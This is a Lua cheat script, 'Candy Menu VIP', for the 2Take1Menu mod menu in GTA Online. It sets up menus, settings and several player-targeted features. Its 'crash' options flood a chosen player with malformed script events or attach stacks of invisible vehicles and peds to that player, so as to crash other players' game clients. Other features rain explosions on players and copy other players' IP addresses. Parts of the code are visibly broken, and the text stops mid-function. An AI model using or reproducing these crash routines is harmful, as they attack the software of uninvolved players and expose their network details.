local function RGBAToInt(R, G, B, A)
	A = A or 255
	return ((R&0x0ff)<<0x00)|((G&0x0ff)<<0x08)|((B&0x0ff)<<0x10)|((A&0x0ff)<<0x18)
end
menu.notify("Welcome to Candy Menu VIP", "Candy Menu VIP", 6, RGBAToInt(0, 182, 255))
menu.notify("I'm always keeping my eyes on you, by the means you know or not!", "Candy Menu VIP", 6, RGBAToInt(80, 0, 180))

menu.create_thread(function()
    script_execute_scaleform = graphics.request_scaleform_movie("mp_big_message_freemode")
    script_execute_scaleform_do = 1
    audio.play_sound_from_coord(-1, "LOSER", player.get_player_coords(player.player_id()), "HUD_AWARDS", false, 0, true)
    script_execute_scaleform_thread = menu.create_thread(function()
        while script_execute_scaleform_do == 1 do
            system.yield(0)
        end
    end, nil)
    system.wait(5000)
    audio.play_sound_from_coord(-1, "CHECKPOINT_AHEAD", player.get_player_coords(player.player_id()), "HUD_MINI_GAME_SOUNDSET", false, 0, true)
    graphics.set_scaleform_movie_as_no_longer_needed(script_execute_scaleform)
    menu.delete_thread(script_execute_scaleform_thread)
end, nil)

function Load_settings()
local Root = (utils.get_appdata_path("PopstarDevs", "2Take1Menu") ..  "\\scripts\\Candy" .. "\\Luaconfig.ini")
if not utils.file_exists(Root) then
menu.notify("未发现已保存的设置", "", 6, RGBAToInt(255, 0, 0, 255))

local file = io.open(Root, "a")
todaysdate = os.date("%d-%m-%y")
file:write(tostring("DateSettingsSaved=" .. todaysdate) .. "\n")
file:close()
menu.notify("已创建默认配置文件!!\n请自定义设置并保存\n然后重新载入脚本", "", 6, RGBAToInt(255, 0, 0, 255))
end
end

local Paths = {}
local Settings = {}
local essentials = {}
local kek_entity = {}
local xml_handler = require("Candy/Lib/Menyoo")
local memory = require("Candy/Lib/Memory")
local natives = require("Candy/Lib/Natives")
local script_func = require("Candy/Lib/Script_Func")
local utilities = require("Candy/Lib/Utils")
local text_func = require("Candy/Lib/Text_Func")
Paths.Root = utils.get_appdata_path("PopstarDevs", "2Take1Menu")
rootPath = utils.get_appdata_path("PopstarDevs", "2Take1Menu")
custum_chat = rootPath .. "\\scripts\\Candy\\Lua_Settings\\chat.txt"
utils.make_dir(Paths.Root  .. "\\scripts\\Candy\\Lua_Settings")
Paths.Cfg = Paths.Root .. "\\scripts\\Candy\\Lua_Settings"
Paths.luafiles = Paths.Root .. "\\scripts\\Candy" 
Paths.Settings = Paths.Cfg .. "\\Luaconfig.ini"
Settings["DateSettingsSaved"] = ""
Settings["zhoushenbiaoji"] = false
Settings["fantanjiaobenshijian"] = false
Settings["zaijupingbi"] = false
Settings["wutipingbi"] = false
Settings["wudijiance"] = false
Settings["MK2jiance"] = false
Settings["zidonghuixue"] = false
Settings["zidongfuhuo"] = false
Settings["gongjipengyou"] = false
Settings["tianjipaowulengque"] = false
Settings["zaijukuaisukaihuo"] = false
Settings["zaijujiashiqiang"] = false
Settings["kaiqikuaisusheji"] = false
Settings["mingchengzhanshi"] = true
Settings["mingchengzhanshishuban"] = false
Settings["mingchengzhanshihengban"] = true
Settings["guanggaojilanjie"] = true
Settings["dangqianshisu"] = false
Settings["kongxiqiang"] = false
Settings["yunshiqiang"] = false
Settings["shayuqiang"] = false
Settings["yuanzinengzidan"] = false
Settings["miaozhunkongxi"] = false
Settings["aimprotremoveweapon"] = false
Settings["aimprotupn"] = false
Settings["auto_delivery"] = false
Settings["pedpingbi"] = false
Settings["pedshanchu"] = false
Settings["xianshishijian2"] = false
Settings["carshanchu"] = false
Settings["hisplayer"] = false
Settings["Block_MK1"] = false
Settings["Block_M2K"] = false
Settings["FUCK_VEHCAR"] = false
Settings["ceshifanghu32"] = false
Settings["GIFguajian"] = false
Settings["yanhuaqiang"] = false
Settings["AutoRefillAmmo"] = false
Settings["apocalypse_gun"] = false
Settings["yanhuaqiang1"] = false
Settings["yanhuaqiang3"] = false
Settings["colorqiang"] = false
Settings["health_cheat"] = false
Settings["guanggaojilanjie1"] = false
Settings["fast_respawn"] = false
Settings["apocalypse_gun1"] = false
Settings["auto_skip"] = false
Settings["_U_Anti_spectater"] = false
Settings["_U_Chat_trial2"] = false
Settings["auto_fz"] = false
Settings["_U_fuck_spectater"] = false
Settings["yushiwuzheng"] = false
Settings["zhongwentishi"] = false
Settings["players_Join"] = false
Settings["SpeedupMyVeh"] = false
Settings["delete_gun"] = false
Settings["gametime"] = false
Settings["Rockstars"] = false
Settings["New_History"] = false
Settings["GIFzs"] = 30
Settings["GIFX"] = 0.7
Settings["GIFY"] = 0.8
Settings["GIFDAXIAO"] = 1
Settings["GIFKEJIANDU"] = 1
Settings["zhujixulie1"] = 1
Settings["_U_show_notice_x"] = 1
Settings["_U_show_notice_y"] = 1
Settings["_U_show_notice"] = false 
Settings["_U_show_notice_r"] = 255
Settings["_U_show_notice_g"] = 255
Settings["_U_show_notice_b"] = 255
Settings["_U_show_notice_max"] = 10
Settings["_U_show_notice_size"] = 30
Settings["strarS_x_type"] = 1
Settings["strarS_y_type"] = 1

Settings["bjshanchu"] = false
Settings["veh_on_water"] = false
Settings["clear_notice"] = false
Settings["check_god"] = false
Settings["zhujixulie_weizhi_YY"] = 1

Settings["zhujixulie_weizhi_XX"] = 1

Settings["DONGJIEPED"] = false
Settings["smoke_colors"] = false
Settings["smoke_delay"] = 1
Settings["vehicle_arms1"] = false
Settings["vehicle_arms2"] = false
Settings["auto_clean"] = false
Settings["Who_looking"] = false

function Print(text)
print(text)
local txt = Cur_Date_Time()
local file = io.open(Paths.Root .. "\\2Take1Menu.log", "a")
io.output(file)
io.write("\n" .. txt .. "\t")
io.write(tostring(text))
io.close()
end

function SaveSettings()
Settings["DateSettingsSaved"] = os.date("%d-%m-%y")
    
local file = io.open(Paths.Settings, "w")
for k,v in pairs(Settings) do
file:write(tostring(k) .. "=" .. tostring(v) .. "\n")
end
file:close()
end

function LoadSettings()
if not utils.file_exists(Paths.Settings) then
print("No saved settings")
return
end
for line in io.lines(Paths.Settings) do
local separator = line:find("=", 1, true)
if separator then
local key = line:sub(1, separator - 1)
local value = line:sub(separator + 1)
Settings[key] = value
end
end
end
    
function Load_Settings()
if not utils.file_exists(Paths.Settings) then

return
end
for line in io.lines(Paths.Settings) do
local separator = line:find("=", 1, true)
if separator then
local key = line:sub(1, separator - 1)
local value = line:sub(separator + 1)
if value == string.format("true") then
value = true
elseif value == string.format("false") then
value = false
else value = value
end
Settings[key] = value
end
end
end
local c = {} 
local a = {} 
local N = {} 
local T = {} 
local H = {}
local R = {}
local J = {}

local req = {}
local playerlist = {}
local allpeds = {}
local allveh = {}
local allobj = {}
local allpickups = {}

crash_strength = 0
crash_strengtc = 30
setting_crash = {}
invalidpeda = {}
playerlist = {}
playlist = {}
a = a or {...}
friendlist = {}
lll = false
C = {} 
CD = 0

c.pC = ped.create_ped
c.host = network.network_is_host
c.pdf = menu.add_player_feature
c.wait = system.wait
c.df = menu.add_feature
c.egec = entity.get_entity_coords
c.ped = player.get_player_ped
c.me = player.player_id
c.random = math.random
c.eser = entity.set_entity_rotation
c.oco = object.create_object
c.vehicle = ped.get_vehicle_ped_is_using
c.navigate = menu.set_menu_can_navigate
c.time = utils.time_ms
c.unload = streaming.set_model_as_no_longer_needed
c.valid = player.is_player_valid
c.sR = streaming.request_model
c.global = script.get_global_i

N.SH = script.get_host_of_this_script
N.sEv = script.trigger_script_event
N.host_kick = network.network_session_kick_player
N.isHost = network.network_is_host
N.sModder = player.set_player_as_modder

V_a = {-1829802492,-1758137366,-1311154784,1939284556,234062309,-482719877,989294410,-82626025,1987142870,-998177792,1323778901,-1291952903,1044193113,-1758137366,-1311154784,989294410,1987142870,-998177792,1323778901,1044193113,2123327359,-1403128555,-1291952903,1939284556,234062309,-482719877,1031562256,819197656,989294410,418536135,917809321,1093792632,-998177792,-313185164,1034187331,1323778901,272929391,960812448,-1134706562,-2120700196,-376434238,408192225,-482719877,-1134706562,-1291952903,-2048333973,-114627507,960812448,-1134706562,-2120700196,-376434238,-1930048799,-1281684762,-1281684762,1824333165,970385471,-42959138,837858166,-1600252419,1181327175,1543134283,-1435527158,-692292317,782665360,-579747861,-1146969353,1542143200,321739290,-212993243,-915704871,-326143852,-899509638,-986944621,349315417,-1685021548,80636076,-227741703,15219735,906642318,-1758137366,2123327359,-1311154784,-1242608589,418536135,1392481335,917809321,1093792632,-998177792,1426219628,1034187331,1663218586,1323778901,2067820283,1939284556,-1291952903,-1216765807,-482719877,1323778901,-1622444098,-313185164,1987142870,-638562243,989294410,819197656,1031562256,-1403128555,2123327359,-591610296,1274868363,-1478704292,2072687711,-674927303,1032823388,-631760477,-1297672541,1591739866,-1757836725,-1089039904,410882957,-1848994066,970385471,410882957,410882957,-1281684762,1075432268,788747387,837858166,-42959138,1543134283}
V_hash_V = {0x9cf21e0f,0xceea3f4b,0xceea3f4b,0xe5a2d6c6,0x2592b5cf,0x2592b5cf,0xB12314E0,0xE5A2D6C6,0xE5A2D6C6,0xB12314E0,0x2592b5cf,0x9cf21e0f}
V_hash_C = {3602674979,-42959138}
V_hash_N = {0x9B22DBAF,0x92991B72}

function get_full_arg_table()
local m = math.random
local a, b = -2147483647, 2147483647
return { m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b),
m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), 
m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b),
m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b)}
end

function SECrah(pid)
N.sEv(0xc5bc4c4b, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
N.sEv(0xc5bc4c4b, pid, get_full_arg_table())
N.sEv(767605081, pid, get_full_arg_table())
N.sEv(-1949011582, pid, get_full_arg_table())
N.sEv(-2122716210, pid, get_full_arg_table())
N.sEv(-977515445, pid, get_full_arg_table())
N.sEv(-922075519, pid, get_full_arg_table())
N.sEv(-1975590661, pid, get_full_arg_table())
N.sEv(-1882923979, pid, get_full_arg_table())
N.sEv(-2122716210, pid, get_full_arg_table())
N.sEv(0xF5CB92DB, pid, get_full_arg_table())
N.sEv(0x9DB77399, pid, get_full_arg_table())
N.sEv(0xB0886E20, pid, get_full_arg_table())
N.sEv(0xE6116600, pid, get_full_arg_table())
N.sEv(1975590661, pid, get_full_arg_table())
end

function notify_above_map(message)
ui.notify_above_map(message,"ZERTOTON",15)
end

function tx(message, color, txup)
if txup then
ui.notify_above_map(message,"ZERTOTON",color)
	end
end

original_package_path = package.path
package.path = utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\scripts\\Candy\\?.lua"
local essentials
if utils.file_exists(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\scripts\\Candy\\Configure.lua") then
	essentials = require("Configure")
else
	menu.notify("文件缺失,请重新安装配置文件", "发生错误", 3, 6)
	error("缺失一个文件")
end

local u = {}
local o = {
home = utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\",
lib_path = utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\scripts\\Candy\\",
listeners = {
	["player_leave"] = {}
	}
}
local toggle = {}
    Candy_Menu_VIP = {
	toggle = {},
	version = "11"
	}

setmetatable(Candy_Menu_VIP.toggle, {
	__index = function(t, index)
		return toggle[index]
	end,
	__newindex = function()
		essentials.log_error("Tried to modify Candy_Menu_VIP.toggle. This table is read-only.")
	end
})
local player_history = {
	year_parents = {},
	month_parents = {},
	day_parents = {},
	hour_parents = {},
	searched_players = {},
	players_added_to_history = {},
	count = 0
}


	local lib_versions = {
		"V13"
	}

	for i, k in pairs({
		"History_Players"
	}) do
		if not utils.dir_exists(o.lib_path..k) then
			utils.make_dir(o.lib_path..k)
		end
	end
	
	for i, k in pairs(
	{ 
		"Configure"
}) do
	if not utils.file_exists(o.lib_path..k..".lua") then
		essentials.msg("文件缺失, 请下载所需文件.", 6, true)
		error("您在Libs中缺少一个文件, 请重新安装Candy Menu VIP")
	end
	local file = io.open(o.home.."scripts\\Candy\\"..k..".lua")
	local str = essentials.file(file, "read", "*l")
	essentials.file(file, "close")
	if not str or str:match(": (.+)") ~= lib_versions[i] then
		essentials.msg("文件缺失, 请下载所需文件", 6, true)
		error("有一个库文件版本错误, 请重新安装Candy Menu VIP")
	end
end

for i, k in pairs({
	"players.log"
}) do
	if not utils.file_exists(o.lib_path..k) then
		local file = io.open(o.lib_path..k, "w+")
		essentials.file(file, "close")
	end
end

u.new_session_timer = utils.time_ms()

do
local my_pid = player.player_id()
o.listeners["player_leave"]["timer"] = event.add_event_listener("player_leave", function(event)
		if my_pid == event.player then
			u.new_session_timer = utils.time_ms() + 15000
			my_pid = player.player_id()
		end
	end)
end

function player_history.add_features(parent, rid, ip, name)
	if parent.child_count == 0 then
		menu.add_feature("复制玩家信息", "action_value_str", parent.id, function(f, pid)
			if f.value == 0 then
				utils.to_clipboard(rid)
			elseif f.value == 1 then
				utils.to_clipboard(ip)
			elseif f.value == 2 then
				utils.to_clipboard(name)
			end
		end):set_str_data({
			"RID",
			"IP",
			"名字"
		})
		local seen = {}
		for info in essentials.get_file_string("scripts\\Candy\\players.log", "*a"):gmatch("([^\n]*)\n?") do
			if info:find("&"..rid.."&", 1, true) then
				seen[#seen + 1] = (info:match("<(.+)>") or "").." "..(info:match("!(.+)!") or "")
			end
		end
		menu.add_feature("第一次遇见"..": "..seen[1], "action", parent.id)
		if #seen > 1 then
			menu.add_feature("最后遇见"..": "..seen[#seen], "action", parent.id)
			menu.add_feature("遇到过".." "..#seen.." ".."次 ", "action", parent.id)
		else
			menu.add_feature("遇到过".." "..#seen.." ".."次 ", "action", parent.id)
		end
	end
end

function player_history.get_date()
	local day_num = tonumber(os.date("%d"))
	if day_num == 1 then
		day_num = "1st"
	elseif day_num == 2 then
		day_num = "2nd"
	elseif day_num == 3 then
		day_num = "3rd"
	else
		day_num = day_num.."th"
	end
	local month = os.date("%B").."_".. os.date("%m")
	local day = os.date("%A").." "..day_num.." of "..month:match("(.+)_")
	local year = os.date("%Y")
	local time = os.date("%H").." o'clock"
	local date = os.date("%x")
	return month, day, year, time, date
end

a.mainmenu = c.df("Candy Menu VIP","parent",0)
local function Cped(type, hash, pos, dir)
	streaming.request_model(hash)
    while not streaming.has_model_loaded(hash) do
		system.wait(10)
    end
    local ped = ped.create_ped(type, hash, pos, dir, true, false)
    streaming.set_model_as_no_longer_needed(hash)
    return ped
end

local function hashmodel(J)
	local hash
    hash = J
    streaming.request_model(hash)
    while(not streaming.has_model_loaded(hash))
    do
        system.wait(0)
    end
    player.set_player_model(hash)
    streaming.set_model_as_no_longer_needed(hash)
    return HANDLER_POP
end

function taomocar1(hash, cpid, npc_car,indesx)
	pos = player.get_player_coords(cpid)
	local offset = v3(0,0,-10)
	local rot = v3(0.0,0,0.0)
	local carbc = spawn_vehicle(hash,pos,indesx)
	network.has_control_of_entity(carbc)
	entity.set_entity_visible(carbc,false)
	entity.set_entity_god_mode(carbc, true)
	network.request_control_of_entity(carbc)
	entity.attach_entity_to_entity(carbc, npc_car, 0, offset, rot, true, false, false, 0, true)
end

local function blockfile(TXT)
	local file = io.open(rootPath .. "\\scripts\\ini\\block.txt", "w")
	io.output(file)
	io.write(TXT)
	system.wait(50)
	io.close()
end

local aX = {
    ["police_outfit"] = {
        ["female"] = {
            ["clothes"] = {{0, 0}, {0, 6}, {0, 14}, {0, 34}, {0, 0}, {0, 25}, {0, 0}, {0, 35}, {0, 0}, {0, 0}, {0, 48}},
            ["props"] = {{0, 45, 0}, {1, 11, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
        },
        ["male"] = {
            ["clothes"] = {{0, 0}, {0, 0}, {0, 0}, {0, 35}, {0, 0}, {0, 25}, {0, 0}, {0, 58}, {0, 0}, {0, 0}, {0, 55}},
            ["props"] = {{0, 46, 0}, {1, 13, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
        }
    },
    ["bac_outfit"] = {["textures"] = {}, ["clothes"] = {}, ["prop_text"] = {}, ["prop_ind"] = {}, ["gender"] = nil},
    ["session_crash"] = {["textures"] = {}, ["clothes"] = {}, ["prop_text"] = {}, ["prop_ind"] = {}}
}

local function appearance()
    for i = 1, 11 do
    aX["session_crash"]["textures"][i] = ped.get_ped_texture_variation(player.get_player_ped(player.player_id()), i)
    aX["session_crash"]["clothes"][i] = ped.get_ped_drawable_variation(player.get_player_ped(player.player_id()), i)
    end
    local aw = {0, 1, 2, 6, 7}
    for az = 1, #aw do
    aX["session_crash"]["prop_ind"][az] = ped.get_ped_prop_index(player.get_player_ped(player.player_id()), aw[az])
    aX["session_crash"]["prop_text"][az] = ped.get_ped_prop_texture_index(player.get_player_ped(player.player_id()), aw[az])
    end
end

local function restore(modhash)
        hashmodel(modhash)
        system.wait(250)
        ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
        system.wait(3500)
        local cx = aX["session_crash"]["clothes"]
        local cy = aX["session_crash"]["textures"]
        for i = 1, 11 do
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), i, cx[i], cy[i], 2)
        end
        local aw = {0, 1, 2, 6, 7}
        local ax = aX["session_crash"]["prop_ind"]
        local ay = aX["session_crash"]["prop_text"]
        for az = 1, #aw do
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), aw[az], ax[az], ay[az], 0)
    end
end

function request_model(h, t)
if not h then 
return 
end
if not streaming.has_model_loaded(h) then
streaming.request_model(h)
local time = utils.time() + t
while not streaming.has_model_loaded(h) and time > utils.time() do
system.wait(5)
end
end
return streaming.has_model_loaded(h)
end
		
function requestmodel(hash)
	streaming.request_model(hash)
	while (not streaming.has_model_loaded(hash)) do
    c.wait(0)
	end
	return streaming.has_model_loaded(hash)
 end
  
function modelchange(hash)
	requestmodel(hash)
	player.set_player_model(hash)
	streaming.set_model_as_no_longer_needed(hash)
end
		
function spawn_vehicle(hash, coords, dir, maxed, god)
	request_model(hash, 1000)
	if maxed then	
	entity.set_entity_coords_no_offset(car, coords)
	entity.set_entity_heading(car, dir)
	if god then
	give_godmode(car, true)
	end
	streaming.set_model_as_no_longer_needed(hash)
	return car
	else
local car = vehicle.create_vehicle(hash, coords, dir, true, false)
		if god then
			give_godmode(car, true)
		end
		streaming.set_model_as_no_longer_needed(hash)
		return car
	end
end		
		
local function request_model(hash)
    local henmss
    if tonumber(hash) and streaming.is_model_valid(hash) then
        if not streaming.has_model_loaded(hash) then
            henmss = true
            streaming.request_model(hash)
            local timeee = utils.time_ms() + 450
            while not streaming.has_model_loaded(hash) and timeee > utils.time_ms() do
                system.yield(0)
            end
        end
        return streaming.has_model_loaded(hash), henmss
    end
end
		
local function get_control_of_entity(h, t)
if not h then 
return
end
if not network.has_control_of_entity(h) then
network.request_control_of_entity(h)
local time = utils.time_ms() + t
while entity.is_an_entity(h) and not network.has_control_of_entity(h) and time > utils.time_ms() do
system.wait(5)
end
end
return network.has_control_of_entity(h)
end

if menu.is_trusted_mode_enabled() == false then
	menu.notify("当前脚本处于未信任模式!")
else
end

function s_coords(i, p)
    req.ctrl(i)
    entity.set_entity_velocity(i, v3())
    entity.set_entity_coords_no_offset(i, p)
end
Load_Settings()

CandyMenu = c.pdf("Candy Menu VIP","parent",0) 
crashCrash = c.pdf("崩溃选项","parent",CandyMenu.id) 
a.seplayer = c.df("玩家自我选项","parent",a.mainmenu.id)
a.vehicleset = c.df("载具修改选项","parent",a.mainmenu.id)
a.teleport = c.df("传送选项", "parent", a.seplayer.id)
a.onlineplayer = c.df("战局玩家列表","parent",a.mainmenu.id)
a.friendlists = c.df("档案好友列表", "parent", a.mainmenu.id)
a.sessionoption = c.df("全局玩家选项","parent",a.mainmenu.id)
a.yule = c.df("娱乐能力选项","parent",a.mainmenu.id)
a.hisplayer = c.df("历史玩家列表", "parent", a.mainmenu.id)
rwugn = menu.add_feature("任务辅助选项","parent", a.mainmenu.id, function()
end)
a.protoption = c.df("防护检测选项","parent",a.mainmenu.id)
a.qita = c.df("其他更多选项","parent",a.mainmenu.id)
adlanjie123 = menu.add_feature("拦截选项","parent",a.qita.id,function()
end)

egao = c.pdf("恶搞选项","parent",CandyMenu.id) 

menu.add_player_feature("天基炮袭击", "action", egao.id, function(feat, pid)
    local d = player.get_player_ped(pid)
    local pos = player.get_player_coords(pid)
    audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_LASER", pos, 0, true, 10000000000, false)
    audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_LASER", pos, 0, true, 10000000000, true)
    system.wait(100)
    audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_EXPLOSION",  pos, "DLC_XM_Explosions_Orbital_Cannon", true, 100000000000, false)
    audio.play_sound_from_coord(-1, "ORBITAL_CANNON_FIRE_EXPLOSION",  pos, "DLC_XM_Explosions_Orbital_Cannon", true, 100000000000, false)

    graphics.set_next_ptfx_asset("scr_xm_orbital")

    while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
        graphics.request_named_ptfx_asset("scr_xm_orbital")
        system.wait(0)
    end

    graphics.start_networked_particle_fx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 5, true, true, true)

    fire.add_explosion(pos, 59, true, false, 1.5, d)
    fire.add_explosion(pos, 60, true, false, 1.8, d)
    fire.add_explosion(pos, 62, true, false, 2.0, d)
    fire.add_explosion(pos, 52, true, false, 1.0, d)
    fire.add_explosion(pos, 50, true, false, 1.0, d)
    fire.add_explosion(pos, 29, false, false, 29.0, d)
    fire.add_explosion(pos, 29, true, false, 29.0, d)

    graphics.start_networked_particle_fx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 10, true, true, true)
end)


menu.add_player_feature("冲击波袭击", "action", egao.id, function(f, pid)
    for i = 5, 30 do
        fire.add_explosion(player.get_player_coords(pid) + v3(math.random(-2, 2), math.random(-2, 2), math.random(-2, 2)), 70, true, false, 0.6, player.get_player_ped(pid))
        system.wait(math.random(0, 1))
    end
end)

function requestmodel(hash)
    streaming.request_model(hash)

    while (not streaming.has_model_loaded(hash)) do
        system.wait(0)
    end

    return streaming.has_model_loaded(hash)
end

c.pdf("主机崩溃","action",crashCrash.id,function(k,pid)
	local deathpos = v3(-16257.853, 10793.688, 893.610)
	local pedp  = player.get_player_ped(player.player_id())
	local mypos = player.get_player_coords(player.player_id())
	entity.freeze_entity(pedp,true)
	entity.set_entity_coords_no_offset(pedp, deathpos)
	system.yield(1000)
	entity.freeze_entity(pedp,false)
	entity.set_entity_coords_no_offset(pedp,mypos)
	menu.notify("Done","2Take1Menu",5,61000)	
	end)

c.pdf("主机崩溃V2","action",crashCrash.id,function(k,pid)
	local deathpos = v3(-6170, 10837, 40)
    local pedp  = player.get_player_ped(player.player_id())
    local mypos = player.get_player_coords(player.player_id())
    entity.freeze_entity(pedp,true)
    entity.set_entity_coords_no_offset(pedp, deathpos)
    system.yield(1000)
    entity.freeze_entity(pedp,false)
    entity.set_entity_coords_no_offset(pedp,mypos)
end)

kkkbojb = c.pdf("MPED崩溃","action",crashCrash.id,function(feat,pid)
	pos = player.get_player_coords(pid)
	dune = spawn_vehicle(3602674979,pos,0)
	entity.set_entity_god_mode(dune,true)
	entity.set_entity_visible(dune,false)
	dune1 = spawn_vehicle(0x9cf21e0f,pos,0)
	entity.set_entity_god_mode(dune1,true)
	entity.set_entity_visible(dune1,false)
	barracks = spawn_vehicle(3602674979,pos,0)
	entity.set_entity_god_mode(barracks,true)
	entity.set_entity_visible(barracks,false)
	barracks1 = spawn_vehicle(0xceea3f4b,pos,0)
	entity.set_entity_god_mode(barracks1,true)
	entity.set_entity_visible(barracks1,false)
	dunecar = spawn_vehicle(0xe5a2d6c6,pos,0)
	entity.set_entity_god_mode(dunecar,true)
	entity.set_entity_visible(dunecar,false)
	barracks3 = spawn_vehicle(0x2592b5cf,pos,0)
	entity.set_entity_god_mode(barracks3,true)
	entity.set_entity_visible(barracks3,false)
	barracks31 = spawn_vehicle(0x2592b5cf,pos,0)
	entity.set_entity_god_mode(barracks31,true)
	entity.set_entity_visible(barracks31,false)
	entity.attach_entity_to_entity(barracks3, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.attach_entity_to_entity(barracks31, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.attach_entity_to_entity(barracks, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.attach_entity_to_entity(barracks1, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.attach_entity_to_entity(dune, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.attach_entity_to_entity(dune1, dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	car = Cped(26,0x92991B72,pos , 0)
	entity.set_entity_god_mode(car, true)

	for i = 5 , 1 do 
	invalidpeda = Cped(26,0x92991B72,pos , 0)
	entity.set_entity_god_mode(invalidpeda, true)
	entity.attach_entity_to_entity(invalidpeda, car, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	end
	
	for i = 8 , 2 do 
	invalidpeda = Cped(26,0x92991B72,pos , 0)
	entity.set_entity_god_mode(invalidpeda, true)
	entity.attach_entity_to_entity(invalidpeda, car, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	end
	
	for i = 2 , 15 do 
	invalidpeda = Cped(26,0x92991B72,pos , 0)
	entity.set_entity_god_mode(invalidpeda, true)
	entity.attach_entity_to_entity(invalidpeda, car, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	end
	entity.attach_entity_to_entity(car,dunecar, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	pedp = player.get_player_ped(pid)
	entity.attach_entity_to_entity(dunecar, pedp, 0, v3(0,0,-0), v3(0,0,0), true, true, false, 0, true)
	entity.detach_entity(dunecar)
	
	allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
			pedhash = entity.get_entity_model_hash(allpeds[i])
			if pedhash == 0x92991B72 then
			entity.delete_entity(allpeds[i])
			end
		end
		menu.notify("Done","Candy Menu VIP",5,61000)
	end)

rainbowr = 179
rainbowg = 45
rainbowb = 212

menu.add_player_feature("实体崩溃", "action",crashCrash.id,function(f)
	if player.is_player_valid(player.player_id()) then
		pedp = player.get_player_ped(pid)
		pos = player.get_player_coords(pid)
		towtruck = spawn_vehicle(-1323100960, pos,0)
		skylift = spawn_vehicle(-692292317, pos,0)
		cargobob = spawn_vehicle(4244420235, pos,0) 
		cargobob2 = spawn_vehicle(4244420235, pos,0)
		cargobob1 = spawn_vehicle(4244420235, pos,0)
		handler = spawn_vehicle(444583674, pos,0)
		print(skylift)
		entity.attach_entity_to_entity(cargobob,skylift, 0, v3(0,0,0.2), v3(0,0,0),false, true, false, 0, true)
		entity.attach_entity_to_entity(cargobob1,skylift, 0, v3(0,0,-0.2), v3(0,0,0),false, true, false, 0, true)
		entity.attach_entity_to_entity(handler,skylift, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
		entity.attach_entity_to_entity(towtruck,skylift, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
		entity.attach_entity_to_entity(cargobob2,towtruck, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
		entity.attach_entity_to_entity(skylift,pedp, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)       
	end
end)

menu.add_player_feature("HASHOF崩溃", "action",crashCrash.id,function(f)
	if player.is_player_valid(player.player_id()) then
		local model_hash = player.get_player_model(player.player_id())
		local outfit_component_table = {}
		local outfit_component_texture_table = {}
		local outfit_prop_table = {}
		local outfit_prop_texture_table = {}
		for i = 0, 11 do
			outfit_component_table[i] = ped.get_ped_drawable_variation(player.get_player_ped(player.player_id()), i)
			outfit_component_texture_table[i] = ped.get_ped_texture_variation(player.get_player_ped(player.player_id()), i)
		end
		for i = 0, 2 do
			outfit_prop_table[i] = ped.get_ped_prop_index(player.get_player_ped(player.player_id()), i)
			outfit_prop_texture_table[i] = ped.get_ped_prop_texture_index(player.get_player_ped(player.player_id()), i)
		end
		for i = 1, 2 do
			local hash = player.get_player_model(player.player_id())
			if hash == 0x9C9EFFD8 then
				hash2 = 0x705E61F2
			else
				hash2 = 0x9C9EFFD8
			end
			utilities.request_model(hash)
			utilities.request_model(hash2)
			player.set_player_model(hash2)
			system.yield(100)
			ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
			system.yield(100)
			ped.resurrect_ped(player.get_player_ped(player.player_id()))
			system.yield(300)
			player.set_player_model(hash)
			system.yield(100)
			ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
			system.yield(200)
			ped.resurrect_ped(player.get_player_ped(player.player_id()))
			ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
			system.yield(100)
			ped.resurrect_ped(player.get_player_ped(player.player_id()))
			system.yield(100)
		end
		system.wait(1000)
		player_func.change_player_model(model_hash, nil)
		system.wait(100)
		for i = 0, 11 do
			ped.set_ped_component_variation(player.get_player_ped(player.player_id()), i, outfit_component_table[i], outfit_component_texture_table[i], 0)
		end
		for i = 0, 2 do
			ped.set_ped_prop_index(player.get_player_ped(player.player_id()), i, outfit_prop_table[i], outfit_prop_texture_table[i], 0)
		end
		menu.notify("Done", Meteor)
	else
		menu.notify("无效的玩家", Meteor, 3, 211)
	end
end)

menu.add_player_feature("NETWORK崩溃", "action",crashCrash.id,function(f)
	if player.is_player_valid(pid) then
